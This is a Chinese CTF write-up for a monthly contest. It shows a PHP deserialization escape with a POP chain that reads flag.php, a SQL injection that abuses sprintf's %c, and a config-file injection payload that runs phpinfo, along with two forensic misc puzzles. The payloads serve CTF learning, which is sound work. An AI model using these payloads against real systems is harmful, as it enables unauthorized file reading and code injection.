
# 安恒四月赛部分Writeup


                                阅读量   
                                **988001**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](./img/203862/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](./img/203862/t01608653c797383d8b.png)](./img/203862/t01608653c797383d8b.png)



## 前言

这周有安恒的月赛，<br>
又是膜师傅的一天<br>
学到了一些骚姿势：



## web

### <a class="reference-link" name="web1"></a>web1

打开题目发现给出了源码：

```
&lt;?php
show_source("index.php");
function write($data) {
    return str_replace(chr(0) . '*' . chr(0), '', $data);
}
function read($data) {
    return str_replace('', chr(0) . '*' . chr(0), $data);
}
class A{
    public $username;
    public $password;
    function __construct($a, $b){
        $this-&gt;username = $a;
        $this-&gt;password = $b;
    }
}

class B{
    public $b = 'gqy';
    function __destruct(){
        $c = 'a'.$this-&gt;b;
        echo $c;
    }
}

class C{
    public $c;
    function __toString(){
        //flag.php
        echo file_get_contents($this-&gt;c);
        return 'nice';
    }
}

$a = @new A($_GET['a'],$_GET['b']);
//省略了存储序列化数据的过程,下面是取出来并反序列化的操作
$b = unserialize(read(write(serialize($a))));

```

我们来分析一下：

```
function write($data) {
    return str_replace(chr(0) . '*' . chr(0), '', $data);
}

function read($data) {
    return str_replace('', chr(0) . '*' . chr(0), $data);
}
```

这个写函数，当反序列化存储的私有成员是，会有`chr(0)`的出现，所以会对`chr(0) . '*' . chr(0)`进行一个替换，当读取的时候会对``进行一个还原。

看似没有什么问题，但是当我们可以的存储``进行`wirte()`时不会发生改变。但是进行`read()`时，会变为`chr(0) . '*' . chr(0)`由六字符变为三字符，可以实现字符逃逸。。。

我们可以明显看到在 `read` 函数处理后，原先字符中的 ``被替换成 `chr(0).'*'.chr(0)`，但是字符长度标识不变 。所以在进行反序列化的时候，还会继续向后读取，这样序列化的结果就完全不一样了。

所以来看一下如何构造pop链。

```
class A{
    public $username;
    public $password;
    function __construct($a, $b){
        $this-&gt;username = $a;
        $this-&gt;password = $b;
    }
}

class B{
    public $b = 'gqy';
    function __destruct(){
        $c = 'a'.$this-&gt;b;
        echo $c;
    }
}

class C{
    public $c;
    function __toString(){
        //flag.php
        echo file_get_contents($this-&gt;c);
        return 'nice';
    }
}
```

`class C`存在`file_get_contents()`函数，可以读取文件内容，可以让`$c`为`flag.php`,并且存在`__toString()`魔术方法。。 `class B`函数存在`echo` 那么大致思路就出来了

```
&lt;?php


class A{
    public $username;
    public $password;
    function __construct($a, $b){
        $this-&gt;username = $a;
        $this-&gt;password = $b;
    }
}

class B{
    public $b;
    function __destruct(){
        $c = 'a'.$this-&gt;b;
        echo $c;
    }
}
class C{
    public $c = 'flag.php';
    function __toString(){
        //flag.php
        echo file_get_contents($this-&gt;c);
        return 'nice';
    }
}

$aaa = new A();
$bbb = new B();
$ccc = new C();
$bbb-&gt;b=$ccc;
// echo serialize($bbb);
$aaa-&gt;password=$bbb;
echo serialize($aaa);

```

得到`O:1:"A":2:{s:8:"username";N;s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}}`

因为要造成反序列化逃逸：所以password值为：`";s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}`

带入反序列化的解果为：`O:1:"A":2:{s:8:"username";s:3:"aaa";s:8:"password";s:72:"";s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}";}`

所以我们要逃逸的字符为:`";s:8:"password";s:72:"`一共23个字符，但是``替换为`chr(0) . '*' . chr(0)`一次逃逸3个字符，所以要是三的倍数。。所以`password`为`A";s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}`<br>
username为24个``;

payload:

```
a=&amp;b=A";s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}

```

### <a class="reference-link" name="web2"></a>web2

打开页面是一个登陆框：<br>[![](./img/203862/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01bccbf14a14799d67.png)

尝试一下发现存在waf,<br>
于是看一下都过滤了写什么函数。。

[![](./img/203862/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01292dff8c6448865e.png)

发现过滤的挺多的，也挺全的，一时没有了解头绪

看一下源代码，发现了收获，2333

[![](./img/203862/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t019cd7f182040fc1f5.png)

这个`%s`让我想到了格式化字符串的漏洞。。<br>
上网找到这样的一篇文章[参考文章](https://www.cnblogs.com/test404/p/7821884.html)<br>
发现骚姿势，SQL注入可以和格式化字符串一起使用

例如：

```
&lt;?php

$input1 = '%1$c) OR 1 = 1 /*';
$input2 = 39;
$sql = "SELECT * FROM foo WHERE bar IN ('$input1') AND baz = %s";
$sql = sprintf($sql, $input2);
echo $sql;
```

输出为`select * from foo where bar in('') or 1=1 /*') and baz=39`

`%c`起到了类似`chr()`的效果，将数字39转化为`'`，从而导致了sql注入。

我们尝试一下利用这种方法

[![](./img/203862/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01d01d48205a893aab.png)

得到了账户密码

发现是admin用户的密码猜测存在后台，找到了后台的位置`/admin`<br>
然后进行登陆，发现，这是一个套娃题 。。 淦

[![](./img/203862/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01e12d111380a43807.png)

这里面对发现了眼熟的代码：

[![](./img/203862/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0188efbd6d95e4e949.png)

是一个经典的配置文件写入问题漏洞.[参考链接](https://www.cnblogs.com/wh4am1/p/6607837.html)<br>
payload:

```
a';phpinfo();//
```

然后再shell.php看到了phpinfo()的界面。。

我以为就可以得到flag了。。谁知道有`disable_functions`

```
set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,error_log,dl,FFI::cdef,debug_backtrace,imap_mail,mb_send_mail
```

想到了题目给了一个so文件。。猜测是上传so文件来进行提权操作。。。但是尝试了半天无果。。这应该是最后一步了，并且好多人在搅屎

最后两分钟有大佬拿到了一血<br>
tql。



## MISC

### <a class="reference-link" name="blueshark"></a>blueshark

打开题目，发现这是一个蓝牙协议：

[![](./img/203862/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0119f4fd1685b4c84b.png)

发现存在一个7z的压缩包。提示压缩包密码为PIN码

[![](./img/203862/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01b64926b431de0244.png)

一个骚操作将pcap文件后缀改为zip可以得到这个压缩包。。。<br>
然后找到了PIN码的流量，得到PIN码

[![](./img/203862/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01cf12039da7a60674.png)

打开压缩包，得到flag

### <a class="reference-link" name="6G%E8%BF%98%E8%BF%9C%E5%90%97%EF%BC%9F"></a>6G还远吗？

刚开始发现是下载的779MB的文件，就点击下载了，然后去看别的题目了，但是过一会发现这个下载速度不对呀。。意识到事情有一丝丝的不对。。嘿嘿

暂停下载找到下载的临时文件打开得到了flag

[![](./img/203862/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0117eab44fa41354ad.png)

[![](./img/203862/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0150b0a5f9d3bf72cc.png)



## 总结

这次月赛，学到了一些新知识，以及骚操作

大佬们都tql。。。



## 参考链接

[https://www.cnblogs.com/test404/p/7821884.html](https://www.cnblogs.com/test404/p/7821884.html)<br>[https://www.cnblogs.com/wh4am1/p/6607837.html](https://www.cnblogs.com/wh4am1/p/6607837.html)<br>[https://xz.aliyun.com/t/6588](https://xz.aliyun.com/t/6588)
